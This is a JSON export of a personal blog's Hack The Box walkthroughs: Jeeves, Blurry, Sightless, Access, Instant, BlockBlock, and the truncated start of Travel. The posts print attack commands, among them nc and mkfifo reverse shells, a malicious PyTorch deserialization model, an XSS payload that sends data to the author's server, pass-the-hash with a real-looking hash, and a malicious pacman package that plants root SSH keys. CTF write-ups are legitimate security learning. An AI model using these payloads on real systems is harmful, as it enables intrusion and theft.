[{"content":"","date":"7 April 2025","externalUrl":null,"permalink":"/tags/hack-the-box/","section":"Tags","summary":"","title":"Hack the Box","type":"tags"},{"content":"","date":"7 April 2025","externalUrl":null,"permalink":"/tags/hacking/","section":"Tags","summary":"","title":"Hacking","type":"tags"},{"content":" Reconnaissance #Windows # We got port 135, 80, 445 open as in initial scan. ![[Pasted image 20241215194409.png]] We got a web application page running with a search option for articles , and others too Its running on windows 10 and the search option leads to a error page surprisingly. Also it\u0026rsquo;s a SQL error. ![[Pasted image 20241215145119.png]] We got server info from the error ![[Pasted image 20241215145414.png]] I have tried all the things to directory to host enumeration it all failed . The reason is I overlooked a port which is 50000. This port is also had a web page on it. Enumeration # On doing directory enumeration I can a directory in the output ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://jeeves.htb:50000/FUZZ -t 60 ![[Pasted image 20241215194726.png]] After accessing the directory I was so happy to see jenkins. Then I got access easily by injecting this command to download nc from my my machine on the project build. Exploitation # powershell -c \u0026quot;Invoke-WebRequest -Uri 'http://10.10.14.4:8000/nc.exe' -OutFile 'C:\\Windows\\Temp\\good.exe'\u0026quot; Executed it using next build command C:\\\\Windows\\Temp\\good.exe \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; -e cmd.exe Soon after getting user flag I tried this whoami /priv and saw seimpersonate token set enabled and tried some of the attacks from metasploit but failed. Initially to transfer this shell to meterpreter I used exploit/multi/script/web_discovery for the payload windows/meterpreter/reverse_tcp cause x64 was not working. This above module helped me to create a meterpreter shell by giving me a command to paste in the shell session I had. Soon after executing the command and got meterpreter access. As I didn\u0026rsquo;t had any luck with potato attacks. I decided to check other directories and found a file in the Documents folder for our user. Which was CEH.kdbd. which is keepass db file so it required master key to unlock it. I used john to generate hash and then hashcat to crack it. keepass2john CEH.kdbd \u0026gt;\u0026gt; kdbd.hash Then.. hashcat kdbd.hash /usr/share/wordlists/rockyou.txt --user -m 13400 I used --user flag as hash started with name CEH. we got the password which is \u0026lt;Redacted\u0026gt; ![[Pasted image 20241215201728.png]] I opened the db using kpcli --kdb CEH.kdbx and provided master password when prompted Only a password hash sounded interesting to me ![[Pasted image 20241215201952.png]] Privilege Escalation # I checked the hash sanity as Administrator to machine\u0026rsquo;s share using crackmapexec and got a hit crackmapexec smb 10.10.10.63 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 ![[Pasted image 20241215202113.png]] Now using psexec.py I initiated pass the hash attack and to prompt shell psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe ![[Pasted image 20241215202422.png]] Administrator\u0026rsquo;s Desktop folder had this hm.txt which said to look elsewhere for root flag but by issuing dir /R we got to see the alternate data streams for the files. ![[Pasted image 20241215202656.png]] To read the contents of the root flag I typed more \u0026lt; hm.txt:root.txt ![[Pasted image 20241215202910.png]] ","date":"7 April 2025","externalUrl":null,"permalink":"/posts/1743142068376-jeeves-walkthroughhack-the-box/","section":"Posts","summary":"","title":"Jeeves Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"7 April 2025","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"7 April 2025","externalUrl":null,"permalink":"/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":"","date":"7 April 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"7 April 2025","externalUrl":null,"permalink":"/","section":"Secure The Throne","summary":"","title":"Secure The Throne","type":"page"},{"content":"","date":"7 April 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"7 April 2025","externalUrl":null,"permalink":"/tags/walkthrough/","section":"Tags","summary":"","title":"Walkthrough","type":"tags"},{"content":"","date":"7 April 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":" About # Blurry is a medium-difficulty Linux machine that features DevOps-related vectors surrounding machine learning. The foothold is comprised of a series of CVEs recently disclosed about the ClearML suite. The service provides a web platform, a fileserver, and an API; all of which contain vulnerabilities ([CVE-2024-24590](https://nvd.nist.gov/vuln/detail/CVE-2024-24590) - [CVE-2024-24595](https://nvd.nist.gov/vuln/detail/CVE-2024-24595)) that can be chained together for remote code execution. Once a shell on the target is obtained, a program that can be run with sudo is discovered. The program loads arbitrary PyTorch models to evaluate them against a protected dataset. While it is known that such models are susceptible to insecure deserialisation, fickling is used to scan the dataset for insecure pickle files , prior to loading the model. Malicious code can be injected into a model, using runpy to bypass the fickling checks.\nReconnaissance # Initial Nmap scan revealed two open ports. Browsing to the IP led me to a main web application hosted at app.blurry.htb. At this point, I added blurry.htb and app.blurry.htb to my /etc/hosts file for easy access. Enumeration # Through further inspection of the application and some basic fuzzing/DNS enumeration, I discovered multiple subdomains: files.blurry.htb app.blurry.htb chat.blurry.htb api.blurry.htb\nThe chat subdomain contained a messaging system where I found announcements and internal discussions that revealed the app under app.blurry.htb was built using ClearML. This detail turned out to be crucial during exploitation.\nExploitation # Based on my enumeration, I looked into known vulnerabilities for ClearML and came across a Remote Code Execution (RCE) exploit: CVE-2024-24590. The exploit allowed arbitrary code execution via manipulated task scheduling in the ClearML system. Followed the PoC steps from a GitHub repo: Set up and triggered a ClearML task on the host Executed the RCE payload Successfully gained a reverse shell as the blurry user. Also got the User flag Privilege Escalation # Checked for potential privesc vectors and found a sudo permission allowing execution of a script that loads and verifies .pth model files. The script used PyTorch to load models, creating an opportunity for exploitation via the __reduce__ method in a custom model class. I crafted a malicious PyTorch model that, when deserialized by the script, would trigger a reverse shell as root. Learned about this technique from a detailed blog post on ML model deserialization attacks. import torch import torch.nn as nn import os class MaliciousModel(nn.Module): def __init__(self): super(MaliciousModel, self).__init__() self.dense = nn.Linear(10, 1) def forward(self, pk): return self.dense(pk) def __reduce__(self): cmd = \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.65 9001 \u0026gt;/tmp/f\u0026#34; return os.system, (cmd,) malicious_model = MaliciousModel() torch.save(malicious_model, \u0026#39;pk2212.pth\u0026#39;) Used sudo to run the verification script with this model Got a root shell back to my listener and captured the Root flag Summary # Target: Linux machine hosting a ClearML-based app.\nRecon revealed key subdomains and led us to ClearML.\nUsed known CVE-2024-24590 to exploit the ClearML service and gain a foothold.\nEscalated privileges to root via a malicious PyTorch model deserialization attack, leveraging a misconfigured sudo script.\nSuccessfully retrieved both user and root flags.\n","date":"5 April 2025","externalUrl":null,"permalink":"/posts/1743141730514-blurry-walkthroughhack-the-box/","section":"Posts","summary":"","title":"Blurry Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"3 April 2025","externalUrl":null,"permalink":"/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":" Reconnaissance \u0026amp; Enumeration # Network scan reveals three open ports Which are FTP, SSH, http(80). Port 21(FTP) is very unusual here. Initial Enumeration reveals that the page uses nginx/1.18.0 Port 80 had a Slightless Titled page, while scrolling through I found a button which redirected to sqlpad.sightless.htb. It\u0026rsquo;s a different domain so I quickly added it to my hosts file and visited it. Found a RCE vulnerability from google search: POC CVE-2022-0944 Template injection in connection test endpoint leads to RCE in GitHub repository sqlpad/sqlpad prior to 6.10.1.\nExploitation # First I cloned this repo and then I installed all required packages. pip3 install -r requirements.txt Then I execurted the POC and eventually got the shell python3 main.py http://sqlpad.sightless.htb/ 10.10.14.12 6001 There was a sqlite file in the current working directory but, there wasn\u0026rsquo;t any way to transfer it to our machine cause no versions of python found om the system. Then I got to know that this is a docker image. Cause it is weird to have this directory here. Anyway from /etc/passwd I got know about the two users with bash permissions From shadow I got the hash of user michael for cracking. Ignore the root hash i am pretty sure it would be a waste of time. After finding the module, I cracked it with my goto tool hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt then I logged in via SSH Got User flag Privilege Escalation # While doing post-enumeration I found some interesting local ports using ss -tunlp Too many ports don\u0026rsquo;t ya think. Kinda sus if you ask me So I decided to forward all the weird looking ports to my machine On my machine chisel server -p 7001 --reverse On the target machine ./chisel client 10.10.14.12:7001 R:3306:localhost:3306 R:44771:localhost:44771 R:8080:localhost:8080 R:43047:localhost:43047 R:41049:localhost:41049 R:3000:localhost:3000 R:33060:localhost:33060 Not gonna lie that\u0026rsquo;s a lot of ports It seems that port 8080 is running Froxlor, which required credentials to login What is Froxlor The server administration software for your needs. Developed by experienced server administrators, this panel simplifies the effort of managing your hosting platform.\nAll the remaining ports seems to be suspicious cause most are non-http ones Some of the ports are using chrome debugger internally to do some tasks. So I opened chrome and navigated to chrome://inspect/#devices and added all the forwarded ports using configure. Got some hits. I clicked inspect and saw it automatically logging into Froxlor with credentials. From the Network tab, I auth request I saw the credentials in plaintext. Used those creds and got into Froxlor While hanging around, I discovered an potential endpoint that could lead to command injection Created a New PHP version from PHP-FPM versions In the php-fpm restart command I filled it with cp /root/root.txt /home Then went to settings and then restarted the php-fpm After 3-5 min I got the file in the home directory but we need permissions so again using the same method I modified the command to chmod 777 /home/root.txt This will change permissions. Got the User flag Then I realized that from the start I should\u0026rsquo;ve changed permissions for root directory itself Summary # The Sightless machine is an easy-difficulty Linux machine. The walkthrough details the process of exploiting several vulnerabilities to gain root access.\nInitial Foothold: The website uses an SQLPad instance vulnerable to template injection (CVE-2022-0944), which is 1 used to gain access to a Docker container.\nSSH Access: The /etc/shadow file is found within the Docker container, revealing a password hash. Cracking this hash provides SSH access to the host machine.\nPrivilege Escalation: A Froxlor instance vulnerable to Blind XSS (CVE-2024-34070) is exploited to gain access to the FTP service. This FTP service contains a KeePass database. Accessing this database reveals the root SSH keys, granting a privileged shell on the host\n","date":"3 April 2025","externalUrl":null,"permalink":"/posts/1742496891311-sightless-walkthroughhtb/","section":"Posts","summary":"","title":"Sightless Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance # On the initial Nmap scan I can see interesting ports open which are FTP, Telnet and a http port(80) Quickly I checked for anonymous login and it seems like it was enabled. Which was interesting. While at that I also discovered that home page mentions LON-MC6 which leads to MS09-042 a vulnerability in Telnet Definition This security update resolves a publicly disclosed vulnerability in the Microsoft Telnet service. The vulnerability could allow an attacker to obtain credentials and then use them to log back into affected systems. The attacker would then acquire user rights on a system identical to the user rights of the logged-on user. This scenario could ultimately result in remote code execution on affected systems. An attacker who successfully exploited this vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.\nAnyway when I try to login FTP, and it worked but after that I can\u0026rsquo;t access any directories it\u0026rsquo;s simply giving timeouts. Which was frustrating After multiple tries atlast I was able to access the files in FTP. Enumeration # Analyzing backup.mdb # While enumerating the directories I found two files interesting one was an db file - backup.mdb \u0026gt; file backup.mdb backup.mdb: Microsoft Access Database To see the contents of the database I installed a tool sudo apt install mdbtools I can list all the tables using this coomand mdb-tables backup.mdb To get the data from a table I could use this command mdb-export backup.mdb \u0026lt;table-name\u0026gt; From auth_user table I got a username and password \u0026gt; mdb-export backup.mdb auth_user \u0026lt;SNIP\u0026gt; 27,\u0026#34;engineer\u0026#34;,\u0026#34;access4u@security\u0026#34;,1,\u0026#34;02/24/18 1:54:36\u0026#34;,26, \u0026lt;SNIP\u0026gt; Exploitation # Analyzing Access Control.zip # The other file was a compressed zip file - Access Control.zip. I used this password access4u@security for the zip file and extracted it\u0026rsquo;s contents 7z x Access Control.zip It had only one file called Access Control.pst. I can see that this is a outlook mail file. So I used a online PST opener and read it\u0026rsquo;s contents To keep it simple, It had password for another account. The message reads\u0026hellip; Hi there, The password for the “security” account has been changed to 4Cc3ssC0ntr0ller. Please ensure this is passed on to your engineers. Regards, John This username security and the password 4Cc3ssC0ntr0ller works for telnet. So I logged in as user security Then I got the User flag Privilege Escalation # Using cmdkey /list will show the available and stored creds. We can use runas for running as something if appropriate constraints are valid. For an example runas is similar to sudo for windows if not the same. Here in this case we got saved creds so first lets transfer nc.exe to the target machine Then I used this command to save it to a bat file echo c:\\users\\security\\nc.exe -e cmd.exe 10.10.14.12 6001 \u0026gt; shell.bat And execute it with runas command with saved creds for the user administrator runas /user:administrator /savecred c:\\users\\security\\shell.bat This above command will use the saved password for the user Administrator and run the malicious bat file as Administrator I got access as administrator in my shell I got Root access Summary # The Access machine from Hack The Box was an easy Windows-based challenge involving FTP access, database extraction, and privilege escalation. Initial enumeration revealed open FTP, Telnet, and HTTP ports, with anonymous FTP login enabled. A Microsoft Access database (backup.mdb) contained credentials, which unlocked a protected ZIP file leading to an Outlook PST file with another set of credentials. Using Telnet, I logged in as security and retrieved the user flag. Privilege escalation was achieved by leveraging stored credentials with cmdkey and runas, executing a Netcat reverse shell to gain administrator access and retrieve the root flag. The box was straightforward but engaging, with a mix of credential discovery and privilege escalation.\n","date":"1 April 2025","externalUrl":null,"permalink":"/posts/1742496721950-access-walkthroughhtb/","section":"Posts","summary":"","title":"Access Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"1 April 2025","externalUrl":null,"permalink":"/tags/active-directory/","section":"Tags","summary":"","title":"Active Directory","type":"tags"},{"content":"","date":"1 April 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"30 March 2025","externalUrl":null,"permalink":"/tags/android/","section":"Tags","summary":"","title":"Android","type":"tags"},{"content":" Reconnaissance # During the initial scan, we identified two open ports: Port 80 (HTTP) - Web Server\nPort 22 (SSH) - Secure Shell\nUpon accessing the web application, we noticed an option to download a mobile app, which was available in two places on the site. Clicking on the button initiated a download for an application named instant.apk. Enumeration # To analyze the Android application, I downloaded and used jadx to decompile the Java code. While recursive grepping the files grep -r \u0026quot;instant\u0026quot; I got admin jwt token Additionally, I found multiple API endpoints, including a Swagger API documentation page. Definition Swagger UI transforms JSON or YAML files into interactive interfaces that simplify the navigation and testing of endpoints. Its advantages include: Enhanced Interactivity: Allows developers to test methods (GET, POST, PUT, DELETE) and view parameters in real time. when I access it I can see all beautiful endpoints. Upon accessing the Swagger UI, I could see all the available API endpoints. One particularly interesting endpoint allowed reading system logs. Exploiting this, I was able to read /etc/passwd and retrieve system user information. Exploitation # By leveraging the API vulnerability, I requested access to shirohige\u0026rsquo;s private SSH key stored at: /home/shirohige/.ssh/id_rsa After cleaning the key, I used it to log in via SSH: ssh -i id_rsa -vl shirohige instant.htb Got the User flag Privilege Escalation # While exploring the system, I discovered an SQLite database file named instant.db in: /projects/mywallet/Instant-Api/mywallet/instance Upon inspecting the database, I found a table containing usernames and hashed passwords.\nThe hashes were generated using Werkzeug hashing.\nI started cracking the hashes to retrieve plaintext passwords.\nAdditionally, I found backup files of Putty sessions stored in the /opt directory. These session files contained encoded credentials. By using the SolarPuttyDecrypt tool, I was able to decrypt the stored credentials.\nWith the retrieved password, I gained root access. Got the Root flag Summary # Initially, my reconnaissance revealed two open ports: 80 (HTTP) and 22 (SSH). Accessing the web server presented an option to download a mobile application, instant.apk. During enumeration, I decompiled the Android application using jadx. By recursively grepping the decompiled code, I uncovered an admin JWT token and several API endpoints, including a Swagger API endpoint. One particularly interesting endpoint allowed reading logs, which I used to view /etc/passwd and identify users. Moving to exploitation, I leveraged the log reading capability to request and obtain the SSH private key for the user shirohige. After some cleaning, I successfully logged in via SSH using this private key and obtained the user flag. For privilege escalation, I discovered an SQLite database file named instant.db in the application\u0026rsquo;s instance directory. This database contained usernames and Werkzeug-hashed passwords. I proceeded to crack these hashes. Furthermore, I found backups of Putty sessions in the /opt directory. Using the correct password with a tool like SolarPuttyDecrypt, I was able to decode the root password from these session backups. This allowed me to log in as root and retrieve the root flag.\n","date":"30 March 2025","externalUrl":null,"permalink":"/posts/1742496391060-instant-walkthroughhtb/","section":"Posts","summary":"","title":"Instant Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"29 March 2025","externalUrl":null,"permalink":"/tags/block-chain/","section":"Tags","summary":"","title":"Block Chain","type":"tags"},{"content":" Reconnaissance # On scanning with Nmap, it found two ports open 80 and 22-ssh First impression of the web is, It is a Web3 and a chat app. As soon as I open It I could see it. I can easily get that this page is using Ethereum Interesting isn\u0026rsquo;t it, So I Created an account and logged in Has a secure and cool interface to chat The chats data are stored using Ethereum in Blocks Scooped around a little bit and found /admin page but with no access for us The \u0026ldquo;Report User\u0026rdquo; button seems to be little suspicious cause the website is well built but not the report button, It has traditional alert pop up. Enumeration # Turns out the Report User button functionality is vulnerable to XSS The stupid admin is clicking around the links. But the weird thing here is, Admin is only clicking from alert boxes not just the simple URL/links So I made a XSS payload with the help of chatGPT to exfiltrate some data \u0026lt;img src=x onerror=\u0026#34;fetch(\u0026#39;http://10.10.11.43/api/info\u0026#39;).then(response =\u0026gt; {return response.text();}).then(dataFromA =\u0026gt; {return fetch(`http://10.10.14.12:8000/?d=${dataFromA}`)})\u0026#34;\u0026gt; This payload fetches data from /api/info and then returns it to my server. This is simple yet effective payload. Got the admin cookie and tried to access the /admin page. In the Source of admin page, found some interesting endpoints This json-rpc endpoint can query more, like hashes and stuff This Documentation has more info about the stuffs that can be done with this endpoint But particularly this one catches my attention This parameter eth_blockNumber gets the recent block that saved have been saved. I tested the endpoint json-rpc with this eth_blockNumber Seems like the value next to the params value is a boolean The Params value is the the value for the block the request data from it seemed interesting Request {\u0026#34;jsonrpc\u0026#34;:\u0026#34;2.0\u0026#34;,\u0026#34;method\u0026#34;:\u0026#34;eth_getBlockByNumber\u0026#34;,\u0026#34;params\u0026#34;:[\u0026#34;0x3\u0026#34;,true],\u0026#34;id\u0026#34;:1} Response {\u0026#34;id\u0026#34;:1,\u0026#34;jsonrpc\u0026#34;:\u0026#34;2.0\u0026#34;,\u0026#34;result\u0026#34;:{\u0026#34;baseFeePerGas\u0026#34;:\u0026#34;0x2ed9c9d5\u0026#34;,\u0026#34;blobGasUsed\u0026#34;:\u0026#34;0x0\u0026#34;,\u0026#34;difficulty\u0026#34;:\u0026#34;0x0\u0026#34;,\u0026#34;excessBlobGas\u0026#34;:\u0026#34;0x0\u0026#34;,\u0026#34;extraData\u0026#34;:\u0026#34;0x\u0026#34;,\u0026#34;gasLimit\u0026#34;:\u0026#34;0x1c9c380\u0026#34;,\u0026#34;gasUsed\u0026#34;:\u0026#34;0x5208\u0026#34;,\u0026#34;hash\u0026#34;:\u0026#34;0x3a4e1469d5807e4c2aabf2a929f91beb2bc905e079fc5889a476dcf65c716fa2\u0026#34;,\u0026#34;logsBloom\u0026#34;:\u0026#34;0xu0026#34;,\u0026#34;miner\u0026#34;:\u0026#34;0x0000000000000000000000000000000000000000\u0026#34;,\u0026#34;mixHash\u0026#34;:\u0026#34;0x0000000000000000000000000000000000000000000000000000000000000000\u0026#34;,\u0026#34;nonce\u0026#34;:\u0026#34;0x0000000000000000\u0026#34;,\u0026#34;number\u0026#34;:\u0026#34;0x3\u0026#34;,\u0026#34;parentHash\u0026#34;:\u0026#34;0xbb0a3238a043aca148c25eca9495f869c9d77eb4e09aa10d84c7671bf4c3bed1\u0026#34;,\u0026#34;receiptsRoot\u0026#34;:\u0026#34;0x1ee3363046236ead36f002663ef78ab52f67ac34d6f1f88e10d3880f599467fe\u0026#34;,\u0026#34;sha3Uncles\u0026#34;:\u0026#34;0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347\u0026#34;,\u0026#34;size\u0026#34;:\u0026#34;0x27a\u0026#34;,\u0026#34;stateRoot\u0026#34;:\u0026#34;0xbfe4686238e176ede330654210feb1bb7498d93bb02d29f260f8f196a96a606e\u0026#34;,\u0026#34;timestamp\u0026#34;:\u0026#34;0x677ac8f9\u0026#34;,\u0026#34;totalDifficulty\u0026#34;:\u0026#34;0x0\u0026#34;,\u0026#34;transactions\u0026#34;:[{\u0026#34;accessList\u0026#34;:[],\u0026#34;blockHash\u0026#34;:\u0026#34;0x3a4e1469d5807e4c2aabf2a929f91beb2bc905e079fc5889a476dcf65c716fa2\u0026#34;,\u0026#34;blockNumber\u0026#34;:\u0026#34;0x3\u0026#34;,\u0026#34;chainId\u0026#34;:\u0026#34;0x7a69\u0026#34;,\u0026#34;from\u0026#34;:\u0026#34;0xb795dc8a5674250b602418e7f804cd162f03338b\u0026#34;,\u0026#34;gas\u0026#34;:\u0026#34;0x5209\u0026#34;,\u0026#34;gasPrice\u0026#34;:\u0026#34;0x2ed9c9d5\u0026#34;,\u0026#34;hash\u0026#34;:\u0026#34;0xeebe19598f35ccc154e96861f410a90f6a76ab9aeec456a880e6cb8b571faf62\u0026#34;,\u0026#34;input\u0026#34;:\u0026#34;0x\u0026#34;,\u0026#34;maxFeePerGas\u0026#34;:\u0026#34;0x5db393aa\u0026#34;,\u0026#34;maxPriorityFeePerGas\u0026#34;:\u0026#34;0x0\u0026#34;,\u0026#34;nonce\u0026#34;:\u0026#34;0x2\u0026#34;,\u0026#34;r\u0026#34;:\u0026#34;0xa1573f48dd6f63e72b9ce8c6227179a139d59870f4d16e874e88d4b93cba095c\u0026#34;,\u0026#34;s\u0026#34;:\u0026#34;0x79d8d9216eceefec581ef607b2aa74211ce4bdb66171882834b5ab8d117b53d6\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;0x6b388912df3e0c179384903efa36daf47738ec91\u0026#34;,\u0026#34;transactionIndex\u0026#34;:\u0026#34;0x0\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;0x2\u0026#34;,\u0026#34;v\u0026#34;:\u0026#34;0x0\u0026#34;,\u0026#34;value\u0026#34;:\u0026#34;0x2540be400\u0026#34;,\u0026#34;yParity\u0026#34;:\u0026#34;0x0\u0026#34;}],\u0026#34;transactionsRoot\u0026#34;:\u0026#34;0x231277c116523613e92267b48237bd95ea4da316b3b07fa1bb3ad86de49caf78\u0026#34;,\u0026#34;uncles\u0026#34;:[]}} But this response is literally a blob of text with multiple values init which mean nothing to us. Exploitation # As this a array, down here by changing the value of i like 1,2 or 3, we can explore other blocks data \u0026#34;params\u0026#34;:[\u0026#34;0xi\u0026#34;,true] Likewise got a input value on the response from my request. Which is different from my previous requests After trying many Ethereum input data Decoders online, It seemed like hex to me so decoded it with the help of Cyberchef and got a password and username from it. Logged in using SSH and got the User flag Pivoting # User keira can sudo as user paul on a binary called forge forge is the command-line interface (CLI) tool for interacting with a specific framework or environment. It could relate to tools like Foundry for Ethereum development and that\u0026rsquo;s my speculation at first or any it could be someother CLI-based tool with the name forge After hours of research I found that I can use flatten option in forge to write on any file. When someone login in using SSH by a private key, SSH checks the authenticity of the key with its public key on the system. Here using the flatten option in forge, I can simply write the Public key of the user keira to the user paul\u0026rsquo;s public key in his home directory. After that on passing the private key of the user keira I can get ssh shell as user paul Step-1 # - On the system created ssh keys using this command ssh-keygen Step-2 # Copy the public key of user keira to the /tmp folder and Give all necessary permissions. cp .ssh/id_ed25519.pub /tmp/pub chmod 644 /tmp/pub Step-3 # Exploit it using the flatten option to write the public key to the user paul\u0026rsquo;s home directory in this .ssh/authorized_keys file sudo -u paul /home/paul/.foundry/bin/forge flatten /tmp/pub -o /home/paul/.ssh/authorized_keys Step-4 # Now share the private key to the attacker\u0026rsquo;s system and login using the private key as user paul python3 -m http.server --directory .ssh/ Got access as user paul Privilege Escalation # As we can see user paul has SUDO privilege to run pacman To exploit this, we can create an own malicious package and install it using pacman. Initially I was struggling cause of my malicious package that I made is not working as intended. Then after that I used a script from my friend\u0026rsquo;s blog TheCyberSimon. Kindly support his blog too This time the package works #!/bin/bash # Create a working directory mkdir priv \u0026amp;\u0026amp; cd priv # Generate PKGBUILD file cat \u0026lt;\u0026lt;EOF \u0026gt;PKGBUILD pkgname=privesc pkgver=1.0 pkgrel=1 pkgdesc=\u0026#34;Privilege Escalation Package\u0026#34; arch=(\u0026#39;any\u0026#39;) url=\u0026#34;http://example.com\u0026#34; license=(\u0026#39;GPL\u0026#39;) depends=() makedepends=() source=(\u0026#39;authorized_keys\u0026#39;) sha256sums=(\u0026#39;SKIP\u0026#39;) package() { install -Dm755 \u0026#34;\\$srcdir/authorized_keys\u0026#34; \u0026#34;\\$pkgdir/root/.ssh/authorized_keys\u0026#34; } EOF # Generate SSH keys ssh-keygen -t rsa -b 4096 -f id_rsa -N \u0026#34;\u0026#34; mv id_rsa.pub authorized_keys # Build the malicious package makepkg # Output message echo \u0026#34;Malicious package created! Run the following command to deploy:\u0026#34; echo \u0026#34;sudo pacman -U $(pwd)/privesc-1.0-1-any.pkg.tar.zst\u0026#34; echo \u0026#34;Don\u0026#39;t forget to secure your private key: id_rsa This script is quite simple, the script first makes a directory named priv then creates a file named PKGBUILD with malicious code. The malicious code will write the root user\u0026rsquo;s authorized_keys file with our public key This script will also create ssh key for the current system in the current directory without any password and then it will replace the public key to authorized_keys Then It will execute this command makepkg. Which will compile the malicious package and will also move the newly created key. Transfer this malicious package to the target\u0026rsquo;s system and install it using sudo On the host system give all the necessary permissions to our private key and use it to login System have been Rooted successfully Summary # First, the initial scan showed the usual suspects: SSH and a web server on port 80. Right away, the web app looked like a Web3 chat thing powered by Ethereum, which was a bit different. I made an account and poked around. The chat was there, and I noticed this \u0026ldquo;Report User\u0026rdquo; button that felt a bit off. Found an admin page too, but no luck getting in at that point.\nNext came the poking and prodding. That \u0026ldquo;Report User\u0026rdquo; button turned out to be a sweet spot for XSS. The admin on the other end seemed keen on clicking my crafted alerts. Used ChatGPT to whip up a payload to snag their cookie – and it worked like a charm, giving me access to the /admin page. Digging through the source there, I spotted a json-rpc endpoint. That got my attention, especially the eth_blockNumber function. I started messing with the block numbers and noticed I could pull data. One of those inputs looked like hex, so a quick decode with Cyberchef later, and boom, username and password.Time to get in. I took those credentials straight to SSH and landed a shell.Got the user flag, easy enough.\nNow for the real fun – getting root. I saw that user keira could run forge as sudo for paul. Did a bit of digging on forge and saw the flatten option could write files. So, I generated some SSH keys, dropped keira\u0026rsquo;s public key in /tmp, and then used forge flatten to overwrite paul\u0026rsquo;s authorized_keys with it. That gave me SSH access as paul using keira\u0026rsquo;s private key. From there, I noticed paul could run pacman with sudo. I cooked up a simple script to create a malicious package that would replace root\u0026rsquo;s authorized_keys with my own public key. After transferring it over and installing with sudo pacman, I logged in as root with my key and grabbed the root flag. Another one down.\n","date":"29 March 2025","externalUrl":null,"permalink":"/posts/1743038151313-blockblock-walkthroughhack-the-box/","section":"Posts","summary":"","title":"BlockBlock Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"29 March 2025","externalUrl":null,"permalink":"/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"29 March 2025","externalUrl":null,"permalink":"/tags/web3/","section":"Tags","summary":"","title":"Web3","type":"tags"},{"content":" About # Travel is a hard difficulty Linux machine that features a WordPress instance along with a development server. The server is found to host an exposed Git repository, which reveals sensitive source code. The source code is analyzed and an SSRF and unsafe deserialization vulnerability are identified. These are leveraged to gain code execution. A backup password is cracked and used to move laterally. The user is found to be an LDAP administrator and can edit user attributes. This is leveraged to modify group membership and gain root privileges.\nReconnaissance \u0026amp; Enumeration # Nmap scan results: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d3:9f:31:95:7e:5e:11:45:a2:b4:b6:34:c0:2d:2d:bc (RSA) | 256 ef:3f:44:21:46:8d:eb:6c:39:9c:78:4f:50:b3:f3:6b (ECDSA) |_ 256 3a:01:bc:f8:57:f5:27:a1:68:1d:6a:3d:4e:bc:21:1b (ED25519) 80/tcp open http nginx 1.17.6 |_http-server-header: nginx/1.17.6 |_http-title: Travel.Hack The Box | http-methods: |_ Supported Methods: GET HEAD 443/tcp open ssl/http nginx 1.17.6 |_ssl-date: TLS randomness does not represent time | http-methods: |_ Supported Methods: GET HEAD |_http-title: Travel.Hack The Box - SSL coming soon. |_http-server-header: nginx/1.17.6 | ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.Hack The Box/countryName=UK | Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb | Issuer: commonName=www.travel.htb/organizationName=Travel.Hack The Box/countryName=UK | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-04-23T19:24:29 | Not valid after: 2030-04-21T19:24:29 | MD5: ef0a:a4c1:fbad:1ac4:d160:58e3:beac:9698 |_SHA-1: 0170:7c30:db3e:2a93:cda7:7bbe:8a8b:7777:5bcd:0498 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.95%E=4%D=2/27%OT=22%CT=1%CU=40449%PV=Y%DS=2%DC=T%G=Y%TM=67C054B OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=106%GCD=2%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=10A%GCD=1%ISR=10A%TI=Z% OS:CI=Z%II=I%TS=A)SEQ(SP=FB%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GCD OS:=1%ISR=110%TI=Z%CI=Z%TS=A)ECN(R=N)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q= OS:)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R 